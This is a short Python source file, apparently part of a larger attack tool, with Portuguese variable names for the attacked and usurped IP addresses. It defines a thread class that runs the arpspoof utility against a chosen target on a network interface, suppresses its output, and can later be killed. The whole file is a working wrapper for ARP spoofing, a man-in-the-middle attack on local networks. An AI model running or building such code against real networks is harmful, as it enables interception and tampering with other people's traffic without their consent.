import threading 
import os
from subprocess import *

class ARPSpoofing(threading.Thread):
	def __init__(self, interface, ipAtacada, ipUsurpada):
		threading.Thread.__init__(self)
		self.interface = interface
		self.ipAtacada = ipAtacada
		self.ipUsurpada = ipUsurpada

	def run(self):
		try:
			from subprocess import DEVNULL
		except ImportError:
			DEVNULL = open(os.devnull, 'wb')
		try:
			self.p=Popen(['arpspoof','-i',self.interface,'-t',self.ipUsurpada,self.ipAtacada],
				stdin=PIPE,
				stdout=DEVNULL,
				stderr=STDOUT)
		except KeyboardInterrupt:
			raise

	def killer(self):
		self.p.kill()